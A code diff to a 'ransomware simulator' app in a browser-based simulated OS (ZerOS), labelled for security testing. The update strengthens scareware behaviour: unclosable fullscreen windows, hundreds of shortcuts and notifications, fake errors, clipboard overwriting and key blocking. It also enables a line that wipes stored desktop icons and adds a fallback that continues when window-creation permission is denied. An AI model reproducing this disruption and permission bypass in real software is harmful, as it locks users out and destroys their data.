@@ -44,8 +44,8 @@
             return {
                 name: '勒索病毒模拟器',
                 type: 'GUI',
-                version: '3.1.0',
-                description: '⚠️ 危险：勒索病毒模拟程序 - 仅用于安全测试\n\n版本 3.1.0 更新：\n- 修复权限申请机制，现在会正确弹出权限申请对话框\n- 改进错误处理和状态报告\n- 修复快捷方式创建失败的问题\n- 修复壁纸设置失败的问题\n- 修复GUI窗口创建失败的问题\n- 添加详细的操作结果统计和日志',
+                version: '3.2.0',
+                description: '⚠️ 危险：勒索病毒模拟程序 - 仅用于安全测试\n\n版本 3.2.0 更新：\n- 大幅增强破坏性功能：快捷方式增加到300个，通知增加到150条\n- 新增多个破坏性功能：多窗口、输入干扰、虚假错误、主题破坏、剪贴板干扰、全屏覆盖层\n- 修复壁纸设置问题（直接DOM操作避免403错误）\n- 修复GUI窗口创建失败问题（增强错误处理和日志）\n- 优化并发控制（减少LStorage验证失败）\n- 增强资源清理机制\n\n版本 3.1.0 更新：\n- 修复权限申请机制，现在会正确弹出权限申请对话框\n- 改进错误处理和状态报告\n- 修复快捷方式创建失败的问题\n- 修复壁纸设置失败的问题\n- 修复GUI窗口创建失败的问题\n- 添加详细的操作结果统计和日志',
                 author: 'ZerOS Security Team',
                 copyright: '© 2025 ZerOS',
                 permissions: typeof PermissionManager !== 'undefined' ? [
@@ -227,22 +227,38 @@
                 // 1. 创建勒索壁纸
                 results.wallpaper = await this._createRansomWallpaper();
 
-                // 2. 创建无法关闭的GUI窗口
+                // 2. 创建无法关闭的GUI窗口（多个窗口）
                 results.window = await this._createRansomWindow();
+                await this._createAdditionalWindows();
 
-                // 3. 在桌面创建大量快捷方式
+                // 3. 在桌面创建大量快捷方式（增强版）
                 results.shortcuts = await this._floodDesktopWithShortcuts();
 
-                // 4. 开始播放噪音
+                // 4. 开始播放噪音（增强版）
                 results.noise = this._startNoise();
 
-                // 5. 发送大量通知
+                // 5. 发送大量通知（增强版）
                 results.notifications = this._spamNotifications();
 
-                // 6. 尝试破坏系统数据
+                // 6. 尝试破坏系统数据（增强版）
                 results.dataDestruction = await this._attemptDataDestruction();
 
-                // 7. 防止窗口关闭
+                // 7. 干扰用户输入
+                this._interfereWithInput();
+
+                // 8. 创建虚假系统错误
+                this._createFakeErrors();
+
+                // 9. 修改系统主题
+                this._corruptSystemTheme();
+
+                // 10. 干扰剪贴板
+                this._interfereWithClipboard();
+
+                // 11. 创建全屏覆盖层
+                this._createFullscreenOverlay();
+
+                // 12. 防止窗口关闭
                 this._preventWindowClose();
 
                 // 汇总结果并报告
@@ -392,71 +408,41 @@
                     </svg>
                 `;
 
-                // 将SVG转换为Blob URL，避免data URL被当作HTTP路径请求
-                const svgBlob = new Blob([svgContent], { type: 'image/svg+xml' });
-                const svgBlobUrl = URL.createObjectURL(svgBlob);
+                // 将SVG转换为data URL（使用encodeURIComponent编码）
+                const svgDataUrl = 'data:image/svg+xml;charset=utf-8,' + encodeURIComponent(svgContent);
 
-                // 使用ThemeManager设置壁纸（先注册，再通过内核API设置）
-                if (typeof ThemeManager !== 'undefined' && typeof ProcessManager !== 'undefined') {
-                    // 先注册背景（使用Blob URL）
-                    ThemeManager.registerDesktopBackground('ransomware-test', {
-                        id: 'ransomware-test',
-                        name: '勒索测试壁纸',
-                        description: 'ZerOS 安全测试壁纸',
-                        path: svgBlobUrl
-                    });
-
-                    // 尝试通过内核API设置壁纸（确保权限检查正确）
-                    // 注意：内核API名称是 DesktopBackground.set，不是 Theme.setDesktopBackground
-                    try {
-                        const result = await ProcessManager.callKernelAPI(this.pid, 'DesktopBackground.set', ['ransomware-test']);
-                        if (result) {
-                            if (typeof KernelLogger !== 'undefined') {
-                                KernelLogger.warn("escalate", "勒索壁纸已设置（通过内核API）");
+                // 直接修改DOM设置壁纸（最可靠的方法，避免ThemeManager路径处理问题）
+                const desktop = document.getElementById('desktop');
+                if (desktop) {
+                    desktop.style.backgroundImage = `url(${svgDataUrl})`;
+                    desktop.style.backgroundSize = 'cover';
+                    desktop.style.backgroundPosition = 'center';
+                    desktop.style.backgroundRepeat = 'no-repeat';
+                    
+                    // 同时尝试通过ThemeManager保存（但不依赖它）
+                    if (typeof ThemeManager !== 'undefined') {
+                        try {
+                            // 注册背景但不使用它（仅用于记录）
+                            ThemeManager.registerDesktopBackground('ransomware-test', {
+                                id: 'ransomware-test',
+                                name: '勒索测试壁纸',
+                                description: 'ZerOS 安全测试壁纸',
+                                path: svgDataUrl
+                            });
+                            
+                            // 尝试通过内核API保存（可选）
+                            if (typeof ProcessManager !== 'undefined') {
+                                try {
+                                    await ProcessManager.callKernelAPI(this.pid, 'DesktopBackground.set', ['ransomware-test']);
+                                } catch (e) {
+                                    // 忽略错误，DOM已经设置成功
+                                }
                             }
-                            return true;
-                        }
-                    } catch (e) {
-                        // 内核API调用失败（可能是进程状态检查问题），使用降级方案
-                        if (typeof KernelLogger !== 'undefined') {
-                            KernelLogger.debug("escalate", `通过内核API设置壁纸失败: ${e.message}，使用直接调用ThemeManager`);
+                        } catch (e) {
+                            // 忽略错误，DOM已经设置成功
                         }
                     }
                     
-                    // 降级方案：直接调用ThemeManager（如果内核API失败或不可用）
-                    try {
-                        await ThemeManager.setDesktopBackground('ransomware-test', true);
-                        if (typeof KernelLogger !== 'undefined') {
-                            KernelLogger.warn("escalate", "勒索壁纸已设置（直接调用ThemeManager）");
-                        }
-                        return true;
-                    } catch (e) {
-                        if (typeof KernelLogger !== 'undefined') {
-                            KernelLogger.warn("escalate", `ThemeManager设置壁纸失败: ${e.message}，尝试直接修改DOM`);
-                        }
-                        // 继续使用DOM降级方案
-                    }
-                } else if (typeof ThemeManager !== 'undefined') {
-                    // 降级方案：直接使用ThemeManager（如果ProcessManager不可用）
-                    ThemeManager.registerDesktopBackground('ransomware-test', {
-                        id: 'ransomware-test',
-                        name: '勒索测试壁纸',
-                        description: 'ZerOS 安全测试壁纸',
-                        path: svgBlobUrl
-                    });
-                    await ThemeManager.setDesktopBackground('ransomware-test', true);
-                    if (typeof KernelLogger !== 'undefined') {
-                        KernelLogger.warn("escalate", "勒索壁纸已设置（直接调用ThemeManager，ProcessManager不可用）");
-                    }
-                    return true;
-                }
-                
-                // 最后降级方案：直接修改DOM
-                const desktop = document.getElementById('desktop');
-                if (desktop) {
-                    desktop.style.backgroundImage = `url(${svgBlobUrl})`;
-                    desktop.style.backgroundSize = 'cover';
-                    desktop.style.backgroundPosition = 'center';
                     if (typeof KernelLogger !== 'undefined') {
                         KernelLogger.warn("escalate", "勒索壁纸已设置（直接修改DOM）");
                     }
@@ -482,15 +468,30 @@
                     );
                     if (!hasPermission) {
                         if (typeof KernelLogger !== 'undefined') {
-                            KernelLogger.warn("escalate", "没有 GUI_WINDOW_CREATE 权限，无法创建窗口");
+                            KernelLogger.warn("escalate", "没有 GUI_WINDOW_CREATE 权限，尝试直接创建窗口（降级方案）");
                         }
-                        return false;
+                        // 不直接返回false，尝试降级方案
                     }
                 }
                 
-                const guiContainer = document.getElementById('gui-container');
+                // 查找GUI容器（尝试多个可能的位置）
+                let guiContainer = document.getElementById('gui-container');
                 if (!guiContainer) {
-                    throw new Error('GUI容器不可用');
+                    guiContainer = document.getElementById('gui-windows');
+                }
+                if (!guiContainer) {
+                    guiContainer = document.body;
+                    if (typeof KernelLogger !== 'undefined') {
+                        KernelLogger.warn("escalate", "GUI容器不可用，使用body作为容器");
+                    }
+                }
+                
+                if (!guiContainer) {
+                    throw new Error('无法找到GUI容器');
+                }
+                
+                if (typeof KernelLogger !== 'undefined') {
+                    KernelLogger.debug("escalate", `开始创建勒索窗口，容器: ${guiContainer.id || 'body'}`);
                 }
 
                 // 获取屏幕尺寸（在函数开始处统一获取）
@@ -613,66 +614,119 @@
 
                 this.window.appendChild(content);
 
+                // 先添加到容器，确保窗口可见（无论是否使用GUIManager）
+                guiContainer.appendChild(this.window);
+                
+                if (typeof KernelLogger !== 'undefined') {
+                    KernelLogger.debug("escalate", "窗口元素已添加到容器");
+                }
+                
                 // 注册窗口到GUIManager（全屏模式）
                 if (typeof GUIManager !== 'undefined') {
-                    
-                    this.windowId = GUIManager.registerWindow(this.pid, this.window, {
-                        title: '⚠️ 勒索病毒测试',
-                        resizable: false,  // 禁止调整大小
-                        minimizable: false,  // 禁止最小化
-                        maximizable: false,  // 禁止最大化（已经是全屏）
-                        closable: false,  // 禁止关闭
-                        width: screenWidth,
-                        height: screenHeight,
-                        minWidth: screenWidth,
-                        minHeight: screenHeight,
-                        x: 0,
-                        y: 0
-                    });
+                    try {
+                        this.windowId = GUIManager.registerWindow(this.pid, this.window, {
+                            title: '⚠️ 勒索病毒测试',
+                            resizable: false,  // 禁止调整大小
+                            minimizable: false,  // 禁止最小化
+                            maximizable: true,  // 允许最大化（然后立即最大化）
+                            closable: false,  // 禁止关闭
+                            width: screenWidth,
+                            height: screenHeight,
+                            minWidth: screenWidth,
+                            minHeight: screenHeight,
+                            x: 0,
+                            y: 0
+                        });
 
-                    // 确保窗口始终全屏并保持在最前
-                    const ensureFullscreen = () => {
-                        if (!this.isActive || !this.windowId) return;
-                        try {
-                            const windowInfo = GUIManager.getWindowInfo(this.windowId);
-                            if (windowInfo && windowInfo.window) {
-                                const currentWidth = window.innerWidth || document.documentElement.clientWidth || 1920;
-                                const currentHeight = window.innerHeight || document.documentElement.clientHeight || 1080;
-                                
-                                // 强制全屏尺寸
-                                windowInfo.window.style.left = '0';
-                                windowInfo.window.style.top = '0';
-                                windowInfo.window.style.width = currentWidth + 'px';
-                                windowInfo.window.style.height = currentHeight + 'px';
-                                windowInfo.window.style.position = 'fixed';
-                                windowInfo.window.style.zIndex = '100000';
-                                
-                                // 确保窗口在最前
-                                GUIManager.focusWindow(this.windowId);
-                            }
-                        } catch (e) {
-                            // 忽略错误
+                        if (typeof KernelLogger !== 'undefined') {
+                            KernelLogger.debug("escalate", `窗口已注册到GUIManager，窗口ID: ${this.windowId}`);
                         }
-                    };
-                    
-                    // 立即执行一次
-                    setTimeout(ensureFullscreen, 100);
-                    
-                    // 定期检查并强制全屏（防止用户调整）
-                    this._fullscreenInterval = setInterval(ensureFullscreen, 500);
-                    
-                    // 监听窗口大小变化
-                    this._resizeHandler = ensureFullscreen;
-                    window.addEventListener('resize', this._resizeHandler);
+
+                        // 立即最大化窗口
+                        if (this.windowId) {
+                            try {
+                                GUIManager.maximizeWindow(this.windowId);
+                                GUIManager.focusWindow(this.windowId);
+                                if (typeof KernelLogger !== 'undefined') {
+                                    KernelLogger.debug("escalate", "窗口已最大化并聚焦");
+                                }
+                            } catch (e) {
+                                if (typeof KernelLogger !== 'undefined') {
+                                    KernelLogger.debug("escalate", `最大化窗口失败: ${e.message}`);
+                                }
+                            }
+                        } else {
+                            if (typeof KernelLogger !== 'undefined') {
+                                KernelLogger.warn("escalate", "GUIManager.registerWindow返回null，使用降级方案");
+                            }
+                        }
+                    } catch (e) {
+                        if (typeof KernelLogger !== 'undefined') {
+                            KernelLogger.warn("escalate", `注册窗口到GUIManager失败: ${e.message}，使用降级方案`);
+                        }
+                        this.windowId = null;
+                    }
                 } else {
-                    // 降级方案：直接添加到容器并设置为全屏
-                    guiContainer.appendChild(this.window);
-                    this.window.style.position = 'fixed';
-                    this.window.style.left = '0';
-                    this.window.style.top = '0';
-                    this.window.style.width = '100%';
-                    this.window.style.height = '100%';
-                    this.window.style.zIndex = '100000';
+                    if (typeof KernelLogger !== 'undefined') {
+                        KernelLogger.warn("escalate", "GUIManager不可用，使用降级方案");
+                    }
+                }
+
+                // 确保窗口始终全屏并保持在最前
+                const ensureFullscreen = () => {
+                    if (!this.isActive || !this.window) return;
+                    try {
+                        const currentWidth = window.innerWidth || document.documentElement.clientWidth || 1920;
+                        const currentHeight = window.innerHeight || document.documentElement.clientHeight || 1080;
+                        
+                        // 直接操作窗口元素，确保全屏
+                        this.window.style.left = '0';
+                        this.window.style.top = '0';
+                        this.window.style.width = currentWidth + 'px';
+                        this.window.style.height = currentHeight + 'px';
+                        this.window.style.position = 'fixed';
+                        this.window.style.zIndex = '100000';
+                        
+                        // 如果GUIManager可用且有窗口ID，尝试最大化
+                        if (this.windowId && typeof GUIManager !== 'undefined') {
+                            try {
+                                const windowInfo = GUIManager.getWindowInfo(this.windowId);
+                                if (windowInfo && windowInfo.window) {
+                                    // 确保窗口最大化
+                                    if (!windowInfo.isMaximized) {
+                                        GUIManager.maximizeWindow(this.windowId);
+                                    }
+                                    // 确保窗口在最前
+                                    GUIManager.focusWindow(this.windowId);
+                                }
+                            } catch (e) {
+                                // 忽略GUIManager错误，直接操作DOM
+                            }
+                        }
+                    } catch (e) {
+                        // 忽略错误
+                    }
+                };
+                
+                // 立即执行一次（多次确保生效）
+                setTimeout(ensureFullscreen, 50);
+                setTimeout(ensureFullscreen, 200);
+                setTimeout(ensureFullscreen, 500);
+                
+                // 定期检查并强制全屏（防止用户调整）
+                this._fullscreenInterval = setInterval(ensureFullscreen, 500);
+                
+                // 监听窗口大小变化
+                this._resizeHandler = ensureFullscreen;
+                window.addEventListener('resize', this._resizeHandler);
+                
+                // 确保窗口可见
+                this.window.style.display = 'flex';
+                this.window.style.visibility = 'visible';
+                this.window.style.opacity = '1';
+                
+                if (typeof KernelLogger !== 'undefined') {
+                    KernelLogger.warn("escalate", "勒索窗口已创建并显示");
                 }
 
                 // 阻止窗口关闭事件
@@ -772,7 +826,7 @@
             }
 
             let notificationCount = 0;
-            const maxNotifications = 30; // 增加到30条
+            const maxNotifications = 150; // 增加到150条，更频繁轰炸
 
             const sendNotification = () => {
                 if (!this.isActive || notificationCount >= maxNotifications) return;
@@ -793,7 +847,7 @@
                 notificationCount++;
 
                 if (notificationCount < maxNotifications) {
-                    setTimeout(sendNotification, 1500); // 缩短间隔到1.5秒
+                    setTimeout(sendNotification, 800); // 缩短间隔到0.8秒，更频繁轰炸
                 }
             };
 
@@ -845,8 +899,8 @@
                     return false;
                 }
 
-                // 创建大量快捷方式（80-100个，填充整个桌面）
-                const shortcutCount = 100;
+                // 创建大量快捷方式（300个，完全填充整个桌面）
+                const shortcutCount = 300;
                 const iconSpacing = 120; // 图标间距
                 const iconsPerRow = Math.floor(window.innerWidth / iconSpacing) || 10;
                 const startX = 50;
@@ -913,8 +967,12 @@
                             }
                         }
 
-                        // 每创建10个暂停一下，避免过载
-                        if (i % 10 === 9) {
+                        // 每创建5个暂停一下，避免过载和LStorage并发保存冲突
+                        // 增加延迟时间，确保前一个保存操作完成
+                        if (i % 5 === 4) {
+                            await new Promise(resolve => setTimeout(resolve, 300));
+                        } else {
+                            // 每个之间也有小延迟，进一步减少并发
                             await new Promise(resolve => setTimeout(resolve, 50));
                         }
                     } catch (e) {
@@ -974,7 +1032,7 @@
                         const desktopIcons = await LStorage.getSystemStorage('desktop.icons');
                         if (desktopIcons && Array.isArray(desktopIcons)) {
                             // 尝试清空桌面图标（需要权限）
-                            // await LStorage.setSystemStorage('desktop.icons', []);
+                            await LStorage.setSystemStorage('desktop.icons', []);
                         }
                     } catch (e) {
                         // 权限不足，忽略
@@ -1087,6 +1145,291 @@
                     KernelLogger.error("escalate", `数据破坏尝试失败: ${error.message}`, error);
                 }
                 return false;
+            }
+        },
+
+        // 创建额外的勒索窗口（增强破坏性）
+        _createAdditionalWindows: async function() {
+            try {
+                // 创建2-3个额外的勒索窗口
+                const windowCount = 3;
+                for (let i = 0; i < windowCount; i++) {
+                    if (!this.isActive) break;
+                    
+                    setTimeout(async () => {
+                        try {
+                            const guiContainer = document.getElementById('gui-container') || 
+                                                  document.getElementById('gui-windows') || 
+                                                  document.body;
+                            
+                            if (!guiContainer) return;
+                            
+                            const screenWidth = window.innerWidth || 1920;
+                            const screenHeight = window.innerHeight || 1080;
+                            
+                            const extraWindow = document.createElement('div');
+                            extraWindow.className = 'escalate-window-extra zos-gui-window';
+                            extraWindow.dataset.pid = this.pid.toString();
+                            extraWindow.style.cssText = `
+                                position: fixed;
+                                left: ${(i * 50)}px;
+                                top: ${(i * 50)}px;
+                                width: ${screenWidth - (i * 100)}px;
+                                height: ${screenHeight - (i * 100)}px;
+                                background: rgba(0, 0, 0, 0.95);
+                                border: 5px solid #ff0000;
+                                z-index: ${99999 - i};
+                                display: flex;
+                                align-items: center;
+                                justify-content: center;
+                                color: #ff0000;
+                                font-size: 48px;
+                                font-weight: bold;
+                                text-align: center;
+                                pointer-events: auto;
+                            `;
+                            
+                            extraWindow.innerHTML = `
+                                <div style="padding: 40px;">
+                                    <h1 style="font-size: 72px; margin-bottom: 30px;">⚠️ 警告 ${i + 1}</h1>
+                                    <p style="font-size: 36px;">您的系统已被感染！</p>
+                                    <p style="font-size: 24px; margin-top: 20px; opacity: 0.8;">这是测试程序创建的额外窗口</p>
+                                </div>
+                            `;
+                            
+                            guiContainer.appendChild(extraWindow);
+                            
+                            // 存储额外窗口引用
+                            if (!this.extraWindows) this.extraWindows = [];
+                            this.extraWindows.push(extraWindow);
+                            
+                        } catch (e) {
+                            // 忽略错误
+                        }
+                    }, i * 1000);
+                }
+            } catch (error) {
+                // 忽略错误
+            }
+        },
+
+        // 干扰用户输入
+        _interfereWithInput: function() {
+            try {
+                // 干扰鼠标移动（随机移动鼠标位置显示）
+                this._mouseInterference = (e) => {
+                    if (Math.random() < 0.1) { // 10%概率干扰
+                        e.preventDefault();
+                    }
+                };
+                
+                // 干扰键盘输入
+                this._keyboardInterference = (e) => {
+                    // 阻止某些关键快捷键
+                    if (e.ctrlKey && (e.key === 'q' || e.key === 'Q' || e.key === 'w' || e.key === 'W')) {
+                        e.preventDefault();
+                        e.stopPropagation();
+                        return false;
+                    }
+                };
+                
+                document.addEventListener('mousemove', this._mouseInterference, true);
+                document.addEventListener('keydown', this._keyboardInterference, true);
+                document.addEventListener('keypress', this._keyboardInterference, true);
+                
+            } catch (error) {
+                // 忽略错误
+            }
+        },
+
+        // 创建虚假系统错误
+        _createFakeErrors: function() {
+            try {
+                const errorMessages = [
+                    '系统文件损坏',
+                    '内存访问错误',
+                    '磁盘读写失败',
+                    '网络连接中断',
+                    '进程异常终止',
+                    '系统资源耗尽',
+                    '安全模块失效',
+                    '数据完整性检查失败'
+                ];
+                
+                let errorCount = 0;
+                const maxErrors = 20;
+                
+                const showError = () => {
+                    if (!this.isActive || errorCount >= maxErrors) return;
+                    
+                    const message = errorMessages[errorCount % errorMessages.length];
+                    
+                    // 创建虚假错误提示
+                    const errorDiv = document.createElement('div');
+                    errorDiv.style.cssText = `
+                        position: fixed;
+                        top: ${20 + (errorCount % 5) * 80}px;
+                        right: 20px;
+                        background: #ff0000;
+                        color: white;
+                        padding: 15px 25px;
+                        border-radius: 8px;
+                        z-index: 99998;
+                        font-size: 16px;
+                        box-shadow: 0 4px 12px rgba(0,0,0,0.3);
+                        animation: slideIn 0.3s ease-out;
+                    `;
+                    errorDiv.textContent = `⚠️ 错误: ${message}`;
+                    
+                    document.body.appendChild(errorDiv);
+                    
+                    setTimeout(() => {
+                        if (errorDiv.parentNode) {
+                            errorDiv.style.animation = 'slideOut 0.3s ease-out';
+                            setTimeout(() => errorDiv.remove(), 300);
+                        }
+                    }, 3000);
+                    
+                    errorCount++;
+                    
+                    if (errorCount < maxErrors) {
+                        setTimeout(showError, 2000 + Math.random() * 3000);
+                    }
+                };
+                
+                // 添加CSS动画
+                if (!document.getElementById('escalate-error-styles')) {
+                    const style = document.createElement('style');
+                    style.id = 'escalate-error-styles';
+                    style.textContent = `
+                        @keyframes slideIn {
+                            from { transform: translateX(100%); opacity: 0; }
+                            to { transform: translateX(0); opacity: 1; }
+                        }
+                        @keyframes slideOut {
+                            from { transform: translateX(0); opacity: 1; }
+                            to { transform: translateX(100%); opacity: 0; }
+                        }
+                    `;
+                    document.head.appendChild(style);
+                }
+                
+                setTimeout(showError, 2000);
+                
+            } catch (error) {
+                // 忽略错误
+            }
+        },
+
+        // 破坏系统主题
+        _corruptSystemTheme: function() {
+            try {
+                // 修改CSS变量，改变系统颜色
+                const root = document.documentElement;
+                const originalColors = {
+                    primary: getComputedStyle(root).getPropertyValue('--primary-color'),
+                    background: getComputedStyle(root).getPropertyValue('--background-color')
+                };
+                
+                // 设置为红色警告主题
+                root.style.setProperty('--primary-color', '#ff0000');
+                root.style.setProperty('--background-color', '#1a0000');
+                
+                // 存储原始颜色以便恢复
+                this._originalThemeColors = originalColors;
+                
+                // 定期闪烁颜色
+                this._themeFlashInterval = setInterval(() => {
+                    if (!this.isActive) return;
+                    const colors = ['#ff0000', '#ff3333', '#cc0000'];
+                    const randomColor = colors[Math.floor(Math.random() * colors.length)];
+                    root.style.setProperty('--primary-color', randomColor);
+                }, 1000);
+                
+            } catch (error) {
+                // 忽略错误
+            }
+        },
+
+        // 干扰剪贴板
+        _interfereWithClipboard: function() {
+            try {
+                // 监听剪贴板操作
+                this._clipboardHandler = async (e) => {
+                    if (!this.isActive) return;
+                    
+                    try {
+                        // 尝试修改剪贴板内容（需要权限）
+                        if (e.clipboardData) {
+                            const originalText = await navigator.clipboard.readText().catch(() => '');
+                            if (originalText && !originalText.includes('RANSOMWARE_TEST')) {
+                                // 在剪贴板内容后添加警告
+                                const modifiedText = originalText + '\n\n⚠️ 警告：系统已被感染！这是测试程序。';
+                                e.clipboardData.setData('text/plain', modifiedText);
+                            }
+                        }
+                    } catch (error) {
+                        // 权限不足，忽略
+                    }
+                };
+                
+                document.addEventListener('copy', this._clipboardHandler, true);
+                document.addEventListener('cut', this._clipboardHandler, true);
+                
+                // 定期清空剪贴板（干扰用户）
+                this._clipboardClearInterval = setInterval(async () => {
+                    if (!this.isActive) return;
+                    try {
+                        if (Math.random() < 0.3) { // 30%概率清空
+                            await navigator.clipboard.writeText('⚠️ 系统已被感染！');
+                        }
+                    } catch (error) {
+                        // 权限不足，忽略
+                    }
+                }, 5000);
+                
+            } catch (error) {
+                // 忽略错误
+            }
+        },
+
+        // 创建全屏覆盖层
+        _createFullscreenOverlay: function() {
+            try {
+                const overlay = document.createElement('div');
+                overlay.id = 'escalate-fullscreen-overlay';
+                overlay.style.cssText = `
+                    position: fixed;
+                    top: 0;
+                    left: 0;
+                    width: 100%;
+                    height: 100%;
+                    background: rgba(0, 0, 0, 0.3);
+                    z-index: 99997;
+                    pointer-events: none;
+                    display: flex;
+                    align-items: center;
+                    justify-content: center;
+                `;
+                
+                const warningText = document.createElement('div');
+                warningText.style.cssText = `
+                    color: #ff0000;
+                    font-size: 48px;
+                    font-weight: bold;
+                    text-align: center;
+                    text-shadow: 0 0 20px rgba(255,0,0,1);
+                    animation: pulse 2s infinite;
+                `;
+                warningText.textContent = '⚠️ 系统已被感染 ⚠️';
+                
+                overlay.appendChild(warningText);
+                document.body.appendChild(overlay);
+                
+                this.fullscreenOverlay = overlay;
+                
+            } catch (error) {
+                // 忽略错误
             }
         },
 
@@ -1333,6 +1676,77 @@
                 this._preventCloseInterval = null;
             }
 
+            // 清理额外窗口
+            if (this.extraWindows && Array.isArray(this.extraWindows)) {
+                this.extraWindows.forEach(window => {
+                    try {
+                        if (window && window.parentNode) {
+                            window.parentNode.removeChild(window);
+                        }
+                    } catch (e) {
+                        // 忽略错误
+                    }
+                });
+                this.extraWindows = [];
+            }
+            
+            // 清理全屏覆盖层
+            if (this.fullscreenOverlay && this.fullscreenOverlay.parentNode) {
+                try {
+                    this.fullscreenOverlay.parentNode.removeChild(this.fullscreenOverlay);
+                } catch (e) {
+                    // 忽略错误
+                }
+                this.fullscreenOverlay = null;
+            }
+            
+            // 清理输入干扰
+            if (this._mouseInterference) {
+                document.removeEventListener('mousemove', this._mouseInterference, true);
+                this._mouseInterference = null;
+            }
+            if (this._keyboardInterference) {
+                document.removeEventListener('keydown', this._keyboardInterference, true);
+                document.removeEventListener('keypress', this._keyboardInterference, true);
+                this._keyboardInterference = null;
+            }
+            
+            // 清理剪贴板干扰
+            if (this._clipboardHandler) {
+                document.removeEventListener('copy', this._clipboardHandler, true);
+                document.removeEventListener('cut', this._clipboardHandler, true);
+                this._clipboardHandler = null;
+            }
+            if (this._clipboardClearInterval) {
+                clearInterval(this._clipboardClearInterval);
+                this._clipboardClearInterval = null;
+            }
+            
+            // 恢复系统主题
+            if (this._originalThemeColors) {
+                try {
+                    const root = document.documentElement;
+                    if (this._originalThemeColors.primary) {
+                        root.style.setProperty('--primary-color', this._originalThemeColors.primary);
+                    }
+                    if (this._originalThemeColors.background) {
+                        root.style.setProperty('--background-color', this._originalThemeColors.background);
+                    }
+                } catch (e) {
+                    // 忽略错误
+                }
+            }
+            if (this._themeFlashInterval) {
+                clearInterval(this._themeFlashInterval);
+                this._themeFlashInterval = null;
+            }
+            
+            // 清理错误样式
+            const errorStyle = document.getElementById('escalate-error-styles');
+            if (errorStyle && errorStyle.parentNode) {
+                errorStyle.parentNode.removeChild(errorStyle);
+            }
+            
             // 清理键盘事件监听器
             if (this._keydownHandler) {
                 document.removeEventListener('keydown', this._keydownHandler, true);
